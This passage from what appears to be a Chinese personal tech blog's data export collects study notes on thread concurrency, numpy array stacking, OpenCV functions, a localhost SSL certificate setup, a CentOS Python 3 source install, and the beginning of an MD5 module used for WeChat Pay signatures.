0，这个属性也叫做信号量不变性；这个特性可以用来规划禁止区（或许也可以理解为交通路段的禁行区）； 用信号量来实现互斥的原理：将每个共享变量（或者一组相关的共享变量），与一个信号量 s （初始为 1)联系起来，然后用 P 操作和 V 操作将相应的临界区围出来，避免线程进入； 进度图的局限性：无法处理多核处理器的场景，只能用来处理单核处理器； 利用信号量来调度共享资源 除了用于互斥，信号量还可用来调度资源，例如一个线程用信号量来通知另外一个线程，某个条件已经为真了（即通知现在已是绿灯，请快速通行）； 生产者-消费者问题：涉及可用槽、可读数据、互斥锁等三个信号灯； 读者-写者问题：不管是读优先还是写优先，都有可能造成饥饿问题，即某个线程可能处于长久的等待； 除了信号量以外，线程间的同步机制还有很多种，例如更高抽象级别的 JAVA 监控器，C 语言中的 Pthreads 接口； 服务器可以为每个请求临时生成一个线程，当请求结束后，就销毁线程；但这样频繁的创建和销毁线程的性能开销也不小，因此，进一步优化的做法是预先生成多个工作线程；然后将每个请求统一放入请求池中进行缓冲，之后某个线程空闲后，就去池中取一个请求进行处理和响应； I&#x2F;O 多路复用并非编写事件驱动的服务端程序的唯一方法，事实上通过使用连接池 + 预线程化，配合信号量+互斥锁的生产者和消费者模式，也可以模拟出状态机，从而实现事件驱动； 据说 node.js, nginx, tornado 都是基于 I&#x2F;O 多路复用，好奇它们为什么不使用线程？莫非有什么顾虑？答案：原来是因为相比线程，I&#x2F;O 多路复用的性能明显更好； 使用线程提高并行性 线程并非越多越好，当线程数超过了处理器的内核数量时，每个内核都会至少在处理一个线程，多出的线程需要等待，由于还需要考虑线程切换的开销，此时性能反而会下降一点； 后面 CPU 衍化出了超线程技术，原理在于单个 CPU 内核在处理某个线程的任务时，它的所有硬件单元不一定全部都处于工作状态，可能有少部分硬件单元处于闲置；为了让它们也工作起来，最大化利用 CPU 内的硬件单元，就给它们安排处理另外一个线程的活；当然，这样的代价是 CPU 的设计变得更加复杂了，成本会上升不少；在大部分场景下，一般设计为单核双线程，因为再加线程的话，带来的性能提升并不足以覆盖由此带来的成本提升；当然，在某些非常特殊的计算场景中，有可能单核 n 线程存在一定的使用价值；但绝大多数情况下，是得不偿失的； 其他并发问题 线程安全 当一个函数被不同线程反复调用时，都一直能够产生正确的结果，则称其为线程安全的；要编写这种函数必须非常的小心； 四种线程不安全的函数 不保护共享变量的函数 修复：可以通过引入P&#x2F;V 操作来进行保护 代价：减慢了程序的运行时间； 保持跨越多个调用的状态的函数：例如伪随机数生成器 修复：需要改写这个函数，让它不依赖上次调用的状态，而是依赖调用者传入的参数 代价：如果这个函数被很多地方调用，修改涉及的工作量将很大； 返回指向静态变量的指针的函数：每次调用将结果保存在某个指针指向的位置，导致结果可能会被不同线程反复覆盖； 修复 方法一：修改源码，由调用者传递结果存放的地址，而不是使用静态变量； 方法二：不修改源码，但引入互斥锁，将源函数包装一个线程安全的新函数，并将返回的结果复制到一个私有的位置； 调用线程不安全函数的函数：此种情况调用者不一定线程不安全，取决于它怎么写，有无引入保护等； 可重入性 可重入函数的特点是它不引用任何的共享数据； 可重入性的函数一定是线程安全的，但线程安全的函数不一定是可重入的函数； 当可重入函数的参数是值传递时，它是显式可重入的；如果参数是引用传递（即指针），则它是隐式可重入的； 对于隐式可重入，如果调用者小心的传递非共享数据的指针，那么它仍然是可重入的 在线程化的程序中使用已存在的库函数 大多数 Linux 函数，包括定义在 C 标准库中的函数，都是线程安全的，只有一小部分例外，这部分函数由于历史原因，无法重写，但是 Linux 系统同时也提供了这些线程不安全函数的可重入版本；可重入版本的函数名总是以 “_r” 结尾，在编程的时候，应该尽可能使用它们； 竞争 如果一个线程的正确执行，依赖于另外一个线程到达某种状态，那么这两个线程之间存在竞争关系；因为线程是由内核来调度的，我们完全无法确定它们能否按期待到达设定的状态； 例如：在创建新线程时，给它传入一个主线程的变量的指针作为参数，而在主线程的执行过程中，会对这个变量进行修改，那么主线程和新创建的线程之间就会存在竞争关系； 死锁 信号量虽然好用，但是它也引入了另外一个头疼的新问题，即当P 和 V 操作顺序不当时，可能会引发死锁；此时每个线程会在等待一个永远不会发生的 V 操作，导致陷入僵局； 例如有两个信号量分别为 s 和 t，它们都有自己的禁止区，如果它们的禁止区出现重叠，就有可能会触发死锁； 避免死锁的规则：给定所有互斥操作一个全序，如果每个线程都是以一种顺序获得互斥锁并以相反的顺序释放，那么这个程序就是无死锁的； 问题集 加载并执行可执行文件，站在虚拟内存的角度，究竟发生了什么？ 编译器编译源文件，生成可执行目标文件，生成了代码节、数据节等内容；代码节中的内容是指令，它们是按顺序排列的，它们中间可能有跳转指令，会跳转到其他位置的指令；它们也有一些包含引用，引用数据节中的数据，由于代码节和数据节是连续存储的，因此这种引用可以通过偏移量获得； 加载文件的本质，其实是将数据拷贝一份副本，从磁盘的位表示，转移到 DRAM 主存的位表示；当某部分数据在内存中是连续存储时，那么引用数据只需要使用偏移量即可； 在编译器的眼里，它使用的是虚拟内存地址空间；所以它认为空间是独占且连续的； 整个可执行目标文件的每一行，都是有虚拟地址的，因为它们的分布是有规律的，而且都是从零开始的；所以，即使是按偏移量取值，实际上也是在当前指令的虚拟地址基础上增加的偏移量； 分布规律包括：代码节的起始位置，栈的起始位置，内核文件的起始位置等； 对指令的加载，实际上也是通过 CR3 寄存器指向第一条指令入口点的虚拟地址来实现的； 当内核创建进程的时候，就会生成页表，为可执行目标文件中的虚拟地址生成对应的物理地址映射表；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}]},{"title":"numpy vstack hstack dstack 区别","slug":"numpy vstack hstack dstack 区别","date":"2018-11-15T07:48:53.000Z","updated":"2024-09-21T23:17:46.160Z","comments":true,"path":"2018/11/15/numpy vstack hstack dstack 区别/","permalink":"http://example.com/2018/11/15/numpy%20vstack%20hstack%20dstack%20%E5%8C%BA%E5%88%AB/","excerpt":"","text":"先假设有如下数据（用于示范三种函数给这些数据带来的操作效果）123456789101112131415161718import numpy as npdata1 = [[[11, 12, 13], [14, 15, 16], [17, 18, 19]],[[21, 22, 23], [24, 25, 26], [27, 28, 29]],[[31, 32, 33], [34, 35, 36], [37, 38, 39]]]data2 = [[[41, 42, 43], [44, 45, 46], [47, 48, 49]],[[51, 52, 53], [54, 55, 56], [57, 58, 59]],[[61, 62, 63], [64, 65, 66], [67, 68, 69]]]arr1 = np.array(data1)arr2 = np.array(data2)# arr1.shape == [3, 3, 3]# arr2.shape == [3, 3, 3] vstack 解释vstack 表示将数组在第一维进行堆叠（即最外层的方括号），可将 arr1 和 arr2 第一维内的部分视为一个整体，即： 123arr1 == [块1], arr2 == [块2]vstack((arr1, arr2)) == [块1 + 块2] 123456789101112a = np.vstack((arr1, arr2))print a# 结果如下[[[11, 12, 13], [14, 15, 16], [17, 18, 19]],[[21, 22, 23], [24, 25, 26], [27, 28, 29]],[[31, 32, 33], [34, 35, 36], [37, 38, 39]],[[41, 42, 43], [44, 45, 46], [47, 48, 49]],[[51, 52, 53], [54, 55, 56], [57, 58, 59]],[[61, 62, 63], [64, 65, 66], [67, 68, 69]]]# 此时 a.shape == [6, 3, 3] hstack 解释hstack 表示将数组在第二维进行堆叠（即第二层方括号），可将 arr 第二层括号里面的东西视为一个整体，即 123456789101112131415161718arr1 == [[块1],[块2],[块3]]arr2 == [[块4],[块5],[块6]]# 然后 hstack((arr1, arr2)) 的结果如下：[[块1 + 块4],[块2 + 块5],[块3 + 块6]] 123456789b = np.hstack((arr1, arr2))print b# 结果如下：[[[11, 12, 13], [14, 15, 16], [17, 18, 19], [41, 42, 43], [44, 45, 46], [47, 48, 49]],[[21, 22, 23], [24, 25, 26], [27, 28, 29], [51, 52, 53], [54, 55, 56], [57, 58, 59]],[[31, 32, 33], [34, 35, 36], [37, 38, 39], [61, 62, 63], [64, 65, 66], [67, 68, 69]]]# 此时 b.shape == [3, 6, 3] dstack 解释dstack 表示将数组在第三维进行堆叠（即第三层方括号），可将 arr 第三层括号里面的东西视为一个整体，即： 123456789101112131415161718arr1 = [[[块1], [块2], [块3]],[[块4], [块5], [块6]],[[块7], [块8], [块9]]]arr2 = [[[块11], [块12], [块13]],[[块14], [块15], [块16]],[[块17], [块18], [块19]]]# 然后 dstack((arr1, arr2)) 的结果如下：[[[块1 + 块11],[块2 + 块12],[块3 + 块13]][[块4 + 块14],[块5 + 块15],[块6 + 块16]][[块7 + 块17],[块8 + 块18],[块9 + 块19]]] 12345678910print c# 结果如下:[[[11 12 13 41 42 43],[14 15 16 44 45 46],[17 18 19 47 48 49]][[21 22 23 51 52 53],[24 25 26 54 55 56],[27 28 29 57 58 59]][[31 32 33 61 62 63],[34 35 36 64 65 66],[37 38 39 67 68 69]]]# 此时 c.shape == [3, 3, 6]","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"OpenCV 计算机视觉","slug":"OpenCV 计算机视觉","date":"2018-10-29T03:05:00.000Z","updated":"2024-09-22T23:08:41.982Z","comments":true,"path":"2018/10/29/OpenCV 计算机视觉/","permalink":"http://example.com/2018/10/29/OpenCV%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/","excerpt":"","text":"安装open cv 略 处理文件、摄像头和图形用户界面 色彩表示 RGB：三原色表示法 Gamma 校正的原因：由于历史原因，早期只使用 8 位来表示一个颜色维度，这就使得值的范围只能落在 0-255 之间，对于自然界中的颜色来说，这个值范围很小，不足完整表示；同时，人的肉眼，对颜色的感知却是有限的，这意味着有些连续的值，在我们的眼睛里看来，并没有什么变化；此时，这段表示值的数值空间，就存在浪费的问题；而同时还存在着某个连续的值，在我们的眼睛里看来，虽然每个值只增加或减少1，但是感受到变化很大，因为我们的肉眼在某些段有更高的分辨率，能够识别很微小的变化；而某些段则分辨能力很差，其实有很大的值变化，也分辨不出来； 基于以上的背景，为了能够在 8 位的数值范围内，尽量多表示人类肉眼能够识别的颜色空间，我们就用一个函数，将颜色值进行非线性的校正，用少数的值代表我们不能分辨的区域；用多数的值，代表我们能够精细分辨的区域； HSL&#x2F;HSV： Hue 色相，Saturation 饱和度，Value&#x2F;Light 明亮&#x2F;亮度； HSL&#x2F;HSV：一种圆柱形的色彩表示方法，点在圆柱中轴（y 轴）上的位置表示明度，点离截面圆心的距离表示饱和度，点在截面上的角度表示色相； 是三原色模式的一种非线性变换； 灰度图表示：由于灰度图中，只有黑白两色，因此可以用0表示黑，1表示白，0~1 中间的值表示灰； 彩色图表示：每个像素点可以用一个三原色的数组来表示，例如：[158, 128, 47]； 图像压缩：假设三原色数组中，每个原色使用8个二进制位，则可以表示 0-255（十进制） 之间的值；如果将8 位改为4位，则只能表示 0-32 之间的值，颜色的值变少了，但每个原色的位数少了一半，三个原色下来，总共少了8倍的位数； 图像深度：使用多少个二进制位来表示一个原色，即是多少深度，比如8位，即深度为8； 图像通道：使用多少个原色来合成一个像素点，即是多少通道，例如使用三原色，则通道数量为3； YUV： Y 明度，U 色度， V 浓度 用途：一种颜色编码方法，考虑人眼对色彩感知的局限性，适当降低色度的带宽， @property python 没有私有成员、保护成员的机制，因此可以通过单下划线（保护）、双下划线（私有）来区分； 对成员的访问，使用 getter 和 setter 机制，但通过引入 @property ，可以方便的使用访问属性的方法，来间接使用 getter 和 setter；例如： obj.prop &#x3D; 60; 和 obj.prop 会自动映射到 setter 和 getter 方法； 发光物体：加色模型，使用 rgb，红绿蓝 1. 反射物体：减色模型，使用 cmy, 青品黄（印刷为了省成本，单独增加了黑色，即 cmyk） 使用 opencv 处理图像 不同色彩空间的转换 常用的色彩空间：灰度、BGR、HSV 傅里叶变换 高通滤波器：根据像素与周围像素的亮度差值，来提升该像素的亮度，可应用于边缘锐化； 低通滤波器：当像素与周围像素的亮度差值低于某个阈值时，平滑该像素的亮度；主要用于去噪和模糊化，例如高斯模糊； 边缘检测 Canny 边缘检测 轮廓检测 深度估计与分割 人脸检测与识别 Haar 级联 图像检索以及基于图像描述符的搜索 高斯金字塔：其实不是一组金字塔，而是多组；第1组，图片尺寸一样，但高斯滤波系数不同，每一层的滤波系数是上一层滤波系数的 k 倍；第2组，取第1组倒数第三张图片的一半尺寸做为该组第1张图片，然后按上一层的各个滤波系数，生成一组新图片，该组新图片的尺寸都为上一组的一半，每一层的滤波系数跟上一组同一层的滤波系数相同；最后得到 O组 * L 层张图片； 尺度空间：高斯金字塔中，由于总共有 O 组 * L 层张图片，那么以 O 为横坐标，以 L 为纵坐标，就可以组成一个空间，并根据 (o, l）得到该空间中的某一张图片； 差分金字塔（DoG）：当有了高斯金字塔后，将高斯金字塔中，同一组第 i + 1 层图片减去该组的第 i 层图片，即可以得到一个 O 组 * (L - 1) 层的差分金额塔，差分金字塔的信息，是由两张不同高斯滤波系数模糊后的图片相减得来的，因此，它就携带了一些图片上的比较稳定的特征，从而为提取关键特征创建了基础； FLANN：最近似邻居的快速库，fast library of approximate nearest neighor 目标检测与识别 直方图：它是一种显示统计分布情况的图，一般横轴表示数据类型，纵轴表示分布情况；常用于图像处理，例如亮度直方图（图片像素亮度的分布情况）、颜色直方图（图片像素颜色的分布情况）； 颜色梯度：即颜色渐变或颜色变化，16*16的像素块，刚好构成一个九宫格，从中心向外八个方向，会有不同的颜色变化，这8个值，可以构成一个梯度直方图； 图像金字塔：将一张图片，通过采样，生成多张不同分辨率的图片，分辨率从小（最上）到大（最下面），构成了一座金字塔；采样步骤：1，高斯模糊，平滑图像；2，对平滑图像进行抽样，形成新图片； Binary-string descriptors - ORB, BRIEF, BRISK, FREAK, AKAZE etc. Floating-point descriptors - SIFT, SURF, GLOH etc. 其他 图片扭曲：一种数字处理图像的过程，扭曲可以用于校正图像有损；（另外也可以用于图像变形） 在函数 f(x) &#x3D; y 中： 单射函数：对于任意一个 y ，最多有一个 x 与其对应；（每个 y 最多只会被一个 x 射中 ） 满射函数：对于任意一个 y，最少有一个 x 与其对应；（每个 y 都会被射中） 双射函数（双向单射）：对于任意一个 y，有且仅有一个 x 与其对应；（每个 y 被一个唯一的 x 射中，它们结对了） Lab L 表示亮度，a 正数时表示红色，a 负数时表示绿色，b 正数时表示黄色，b 负数时表示蓝色； Lab 能够表示的色域范围比 RGB 和 CMYK 大； 样条函数 spline function 也叫齿函数，“样条”两个字的得名来源于工程中的放样； 它是一种特殊的函数，由多项式分段定义； 插值：根据已知的、离散的数据点，在范围内求出新数据点的过程； 在求解工程问题时，我们通过实验，只能获得数量有限的数据点，我们期望根据有限的数据点，得到一个连续的函数（也即曲线），这个过程叫做拟合； 两种常用的拟合方法 多项式插值：缺点是随着多项式阶数的增加，误差有可能反而增大，即龙格现象（以发现者卡尔龙格命名，即振荡现象） 样条插值：使用分段的低阶多项式进行拟合，避免了龙格现象； 仿射：即仿射映射，指在几何中，一个向量空间进行一次线性变换（相加或缩放），并接上一个平移，变换为另外一个向量空间； 向量空间：它是一些对象（即向量）的集合，这些对象可以进行相加和缩放； numpy arr.shape 以元组的形式返回数组各个维度的个数； 示例 group &#x3D; array([1, 1, 0, 0]) print(group) # [1, 1, 0, 0] print(group.shape) # (4, ) numpy.arange(start, stop, step） 返回开始到结束之间 step 步长的元素组成的数组 示例 arr &#x3D; np.arange(0, 10, 2) print(arr) # [0, 2, 4, 6, 8] arr[1, 1] 使用逗号进行对多维数组特定位置的访问 示例 arr[1, 1] 表示访问 arr 数组第二行的第二列 np.argsort(arr, axis) 对数组按指定轴 axis 的值进行排序，默认为最里面那轴（值为 -1，0表示最外面的轴）； 返回结果：排序后的元素的下标 示例 a &#x3D; [1, 3, 2, 0], np.argsort(a) 的结果为 [3, 0, 2, 1] 3 表示最小的元素的下标为3，第二小的元素的下标为0，以此类推； 挑出数组中指定位置的元素 arr &#x3D; [0, 1, 2, 3, 4] pick &#x3D; [0, 2] arr[pick] &#x3D; [0, 2] np.where 两种用法 三个参数的情况 np.where(cond, x, y)，依次遍历 cond，为 true 取 x, 为 false 取 y 一个参数的情况 np.where( x &gt; 5)，依次遍历 x 的元素，返回两个数组组成的元组(a, b) a 是满足条件的元素的第一维坐标 b 是满足条件的元素的第二维坐标 np.maximum(a, b) 依次遍历比较 a、b 中对应的元素，取最大值； 返回所有最大值元素组成的新数组； a 有可能只是一个整数； np.minimum 用法类似，只是取最小值； 效果同 np.where(a &gt;&#x3D; b, a, b） a &#x3D; np.array([1, 2, 3, 4]) b &#x3D; a + 1 b 为 [2, 3, 4, 5] numpy reshape 如果参数为负数，则表示该维度值不固定，应以另外一个维度进行计算，剩余多出的即为维度值 示例：假设有一个 shape 为 (4, 4) 的数组 如果 reshape(-1, 2)，则变成 (8, 2) ，因为 4 * 4 &#x2F; 2 &#x3D; 8 如果 reshape(2, -1)，则变成 (2, 8)； 如果 reshape(-1)，则变成 (1, 16)； 如果 reshape(-1, 1)，则变成 (16, 1)； python xrange 函数 xrange(start, stop, step)，按 step 步长在 start 和 stop 之间进行遍历； 返回一个生成器；range 则是返回一个 list； np.int0 opencv 函数 cv2.imread 参数说明 cv2.IMREAD_ANYCOLOR &#x3D; 4 cv2.IMREAD_ANYDEPTH &#x3D; 2 cv2.IMREAD_COLOR &#x3D; 1 对于灰色的图片，如果按彩色模式打开，则每个通道都会填充为相同的值； cv2.IMREAD_GRAYSCALE &#x3D; 0 cv2.IMREAD_LOAD-GDAL &#x3D; 8 cv2.IMREAD_UNCHANGED &#x3D; -1 cv2.dilate 膨胀： 膨胀前景（白色的为前景），用一个核去计算每个像素点，该核内的元素，只要有一个为1，该像素点即取1，否则为0； 膨胀的结果，会使得白色区域变大，黑色区域变小； cv2.erode 腐蚀 腐蚀前景（白色的为前景），用一个核去计算每个像素点，该核内的元素，需要全部为1，该像素点才取1，否则为0； 腐蚀的结果，会使得白色区域变小，黑色区域变大； 膨胀与腐蚀的作用 膨胀可以用来消除噪声，减少干扰（膨胀）； 寻找图像中的极大值区域（膨胀），或者极小值区域（腐蚀）； 分割的图像元素成独立的状态（膨胀），或者连接相邻的元素成连接状态（腐蚀） cv2.morphologyEx(src, cv.MORPH_OPEN, kernel) 先腐蚀再膨胀，首先腐蚀可以连通一些断开的点，之后膨胀可以去除噪点； cv2.split 函数 分离图像通道，得到的结果为(r, g, b) 元组 此时如果将得到的值直接用于显示，则实际上是一个灰度图，因为单个通道的图像，等同于黑白； cv2.arcLength 函数 计算轮廓或曲线的周长（长度）； cv2.approxPolyDP 函数 使用多边形来对不规则的图形进行拟合，输入物体的轮廓，返回一个近似轮廓的多边形； 可接受参数 epsilon 用来控制拟合的精确度，它表示原轮廓与多边形的最大减值，这个值越小，拟合就越精确； 最后一个参数用来表示多边形是否闭合 示例 cv2.approxPolyDP( contour, 0.02 * cv2.arcLength(contour), True) cv2.isContourConvex 函数 判断一个轮廓是否为凸多边形； cv2.nameWindow 和 cv2.resizeWindow 可用来改变窗口的大小； 示例 cv.namedWindow(“enhanced”, 0); cv.resizeWindow(“enhanced”, 900, 600); cv.imshow(“enhanced”,img) cv2.findContours 返回的结果 contours 中，每一个 contour 是由连续的点组成的数组，点本身由向量表示，例如二维平面的点表示为 (x, y)； cv2.drawContours(img, contours, contourIdx, color, thickness, lineType, hierarchy, maxLevel, offset) contourIdx 轮廓的索引，-1 表示画出所有轮廓 cv2.bitwise_and(img, img, mask) 可以用来对 mask 区域进行计算，and, or, nor, not 都可以； cv2.resize(src, dsize, fx, fy, interpolation) dsize：目标输出图像的尺寸 fx：目标输入图像 x 轴缩放倍数 fy: 目标输入图像 y 轴缩放倍数 interpolation: 使用的插值方法，默认为 INTER_LINEAR，其他：INTER_AREA, INTER_CUBIC； cv2.warpAffine(src, M, dsize, flags, borderMode, borderValue) 用途：实现对图像的变换，包括缩放、变形、偏移等； M：用来变换计算的矩阵 flags: 插值方法，其中 WARP_INVERSE_MAP 表示 M 是 dst -&gt; src 的相反变换； borderMode：像素的外推法 extrapolation: 外推法根据已知数据集合，外推构建新数据的方法，常用于预测未来产业走向，但结果意义较小，因为不确定性因素较多； 偏移 假设偏移量 (tx, ty) 为 (100, 50) M 为 [(1, 0, 100], [0, 1, 50]] 旋转角度 N M 为 [[cosN, -sinN], [sinN, cosN]] 带缩放倍数旋转 M 为 [[ a, b, (1-a)center.x - bcenter.y], [-b, a, b*centerx + (1 - a)*center.y]] 其中： a &#x3D; scale * cosN b &#x3D; scale * sinN M 可以使用内置函数 cv2.getRotationMatrix2D(center, angle, scale) 获得 仿射变换 M 可通过 cv2.getAffineTransform(pts1_input, pts_output) 获得 其中 pts1_input 为输入图像三个点，pts_output 为输出图像的三个点； cv2.warpPerspective(src, M, dszie, dst, flags, borderMode, boderValue) 透视变换 M 是一个 3*3 矩阵，可通过 cv2.getPerspectiveTransform(pts1_input, pts_output) 获得 其中 pts1_input 为输入图像四个点，pts_output 为输出图像的四个点； 四个点中，需要有三个点不在同一条直线上； cv2.threshhold(src, thresh, maxValue, threshType) 将一张灰度图片，按临界值，进行二值化 threshType THRESH_BINARY, 若大于临界值，取最大值，否则取0 THRESH_BINARY_INV，跟上面的相反，大于临界值取0，否则取最大值； THRESH_TRUNC，若大于临界值，取临界值，否则不变； THRESH_TOZERO，若大于临界值，保持不变，否则取0； THRESH_TOZERO_INV，若大于临界值，取0，否则不变； cv2.adaptiveThreshhod(src, maxValue, adaptiveMethod, thresholdType, blockSize, C) 将一张灰度图片，分成多个小区域，每个小区域进行一次 threshhold adaptiveMethod 自适应方法 cv.ADAPTIVE_THRESH_MEAN_C：取相邻区域的平均值； cv.ADAPTIVE_THRESH_GAUSSIAN_C：取相邻区域的加权平均值（加权算法按高斯窗口） blockSize：用来指定相邻区域的大小，例如 9&#x2F;11&#x2F;13 等； C ：常数，用于对计算结果（平均值或加权平均值）进行扣减； cv2.minAreaRect( points ) 给定一组点的集合，给出一个包含这些点的最小矩形（带角度） 返回值(center, size, angle)","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"计算机视觉","slug":"计算机视觉","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"}]},{"title":"localhost 添加 SSL 证书 （Windows环境 )","slug":"localhost 添加 SSL 证书 （Windows环境 )","date":"2018-08-17T04:35:10.000Z","updated":"2024-09-21T23:17:01.919Z","comments":true,"path":"2018/08/17/localhost 添加 SSL 证书 （Windows环境 )/","permalink":"http://example.com/2018/08/17/localhost%20%E6%B7%BB%E5%8A%A0%20SSL%20%E8%AF%81%E4%B9%A6%20%EF%BC%88Windows%E7%8E%AF%E5%A2%83%20)/","excerpt":"","text":"安装 OpenSSL由于 Windows 不像 Mac OS 和 Linux 自带 openssl，需要另外下载安装；下载链接：http://downloads.sourceforge.net/gnuwin32/openssl-0.9.8h-1-setup.exe点此下载 安装过程略，假设按默认的安装位置为 C:\\Program Files (x86)\\GnuWin32 新建配置文件使用记事本或者其他编辑器，新建文件，命名为 localhost.cnf （注：后缀为 cnf，不是 txt）文件内容设置如下并保存： 12345678910[dn]CN=localhost[req]distinguished_name = dn[EXT]subjectAltName=DNS:localhostkeyUsage=digitalSignatureextendedKeyUsage=serverAuth 假设以上文件的保存位置为 d:\\localhost.cnf，后续会用到 进入命令行界面注：需以管理员身份进入命令行界面进入方式：可以通过右键点击左下角的“开始”按钮或者 进入 OpenSSL 安装文件夹注：假设 OpenSSL 的安装位置为 ‘C:\\Program Files (x86)\\GnuWin32’， 1cd &#x27;C:\\Program Files (x86)\\GnuWin32\\bin&#x27; 执行后类似下面截图： 执行命令1.\\openssl req -x509 -out localhost.crt -keyout localhost.key -newkey rsa:2048 -nodes -sha256 -subj &#x27;/CN=localhost&#x27; -extensions EXT -config d:\\localhost.cnf 注： 由于没有将 openssl 所在路径添加的系统变量 path 中，所以此处 openssl 命令前面需要有 .\\ 两个符号，别漏了； 命令行中，最后的路径 d:\\localhost.cnf 为上一步骤创建的配置文件的保存位置，如果路径不同，则相应修改； 执行后类似下面的截图： 证书生成成功 拷贝证书进入 openssl 的安装文件夹，拷贝已经生成好的证书到需要使用的位置 使用证书示例以下示例假设在 Express 中使用","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"CentOS 安装 Python3","slug":"CentOS 安装 Python3","date":"2018-08-09T08:09:54.000Z","updated":"2024-09-21T23:13:45.839Z","comments":true,"path":"2018/08/09/CentOS 安装 Python3/","permalink":"http://example.com/2018/08/09/CentOS%20%E5%AE%89%E8%A3%85%20Python3/","excerpt":"","text":"创建一个目录用来放下载的安装包源文件sudo mkdir /usr/local/src/python注：若有管理员权限，则 sudo 可以省略，以下同；此处假设源文件存在 &#x2F;usr&#x2F;local&#x2F;src&#x2F;python，也可以存放其他文件夹，相应修改路径即可； 进入该目录cd /usr/local/src/python 下载安装包sudo wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz注：此处假设最新版本为3.7.0，如不是，则相应修改 解压安装包sudo tar -zxvf Python-3.7.0.tgz 进入解压后的文件夹cd Python-3.7.0 设置安装目录此处假设为 &#x2F;usr&#x2F;local&#x2F;python3 sudo ./configure --prefix=/usr/local/python3 编译源文件sudo make 安装源文件sudo make install 建立 python3 软连接（类似建立快捷方式）sudo ln /usr/local/python3/bin/python3 /usr/bin/python3 建立 pip3 软连接sudo ln /usr/local/python3/bin/pip3 /usr/bin/pip3 测试pyhton3 -V若成功屏幕会显示如下 1Python 3.7.0","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"微信支付 MD5 签名中文问题","slug":"微信支付 MD5 签名中文问题","date":"2018-07-27T03:44:09.000Z","updated":"2024-09-21T23:12:59.891Z","comments":true,"path":"2018/07/27/微信支付 MD5 签名中文问题/","permalink":"http://example.com/2018/07/27/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%20MD5%20%E7%AD%BE%E5%90%8D%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98/","excerpt":"","text":"微信支付流程中， 需要先调用微信商户平台的统一下单接口，生成 prepay_id，传输的参数值通常包含中文，示例如下：因此，在进行 MD5 生成签名时，需要注意能够支持中文（注：部分第三方模块存在不支持中文的情况，导致生成的签名，与微信后台生成的签名不一致，出现”签名错误“的提示） 微信公众平台支付接口调试工具（左边地址可以对签名进行调试比对） 解决办法：使用支持中文的MD5 模块即可（模块附后）； 12var md5 = require(&#x27;./lib/js/md5.js&#x27;) // 此处 md5 的存放地址为假设，应根据实际情况调整，md5 模块详细内容附后；var sign = md5(stringSignTemp).toUpperCase(); //假设 stringSignTemp 已经整理好 以下是 md5 模块，其中用到的 crypto 模块也附在本文后面； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191var crypt = require(&#x27;./crypto.js&#x27;);var charenc = &#123; // UTF-8 encoding utf8: &#123; // Convert a string to a byte array stringToBytes: function(str) &#123; return charenc.bin.stringToBytes(unescape(encodeURIComponent(str))); &#125;, // Convert a byte array to a string bytesToString: function(bytes) &#123; return decodeURIComponent(escape(charenc.bin.bytesToString(bytes))); &#125; &#125;, // Binary encoding bin: &#123; // Convert a string to a byte array stringToBytes: function(str) &#123; for (var bytes = [], i = 0; i &lt; str.length; i++) bytes.push(str.charCodeAt(i) &amp; 0xFF); return bytes; &#125;, // Convert a byte array to a string bytesToString: function(bytes) &#123; for (var str = [], i = 0; i &lt; bytes.length; i++) str.push(String.fromCharCode(bytes[i])); return str.join(&#x27;&#x27;); &#125; &#125;&#125;;var utf8 = charenc.utf8;var bin = charenc.bin;function isBuffer(obj) &#123; return !!obj.constructor &amp;&amp; typeof obj.constructor.isBuffer === &#x27;function&#x27; &amp;&amp; obj.constructor.isBuffer(obj)&#125;// The corevar md5 = function(message, options) &#123; // Convert to byte array if (message.constructor == String) if (options &amp;&amp; options.encoding === &#x27;binary&#x27;) message = bin.stringToBytes(message); else message = utf8.stringToBytes(message); else if (isBuffer(message)) message = Array.prototype.slice.call(message, 0); else if (!Array.isArray(message)) message = message.toString(); // else, assume byte array already var m = crypt.util.bytesToWords(message), l = message.length * 8, a = 1732584193, b = -271733879, c = -1732584194, d = 271733878; // Swap endian for (var i = 0; i &lt; m.length; i++) &#123; m[i] = ((m[i] &lt;&lt; 8) | (m[i] &gt;&gt;&gt; 24)) &amp; 0x00FF00FF | ((m[i] &lt;&lt; 24) | (m[i] &gt;&gt;&gt; 8)) &amp; 0xFF00FF00; &#125; // Padding m[l &gt;&gt;&gt; 5] |= 0x80 &lt;&lt; (l % 32); m[(((l + 64) &gt;&gt;&gt; 9) &lt;&lt; 4) + 14] = l; // Method shortcuts var FF = md5._ff, GG = md5._gg, HH = md5._hh, II = md5._ii; for (var i = 0; i &lt; m.length; i += 16) &#123; var aa = a, bb = b, cc = c, dd = d; a = FF(a, b, c, d, m[i + 0], 7, -680876936); d = FF(d, a, b, c, m[i + 1], 12, -389564586); c = FF(c, d, a, b, m[i + 2], 17, 606105819); b = FF(b, c, d, a, m[i + 3], 22, -1044525330); a = FF(a, b, c, d, m[i + 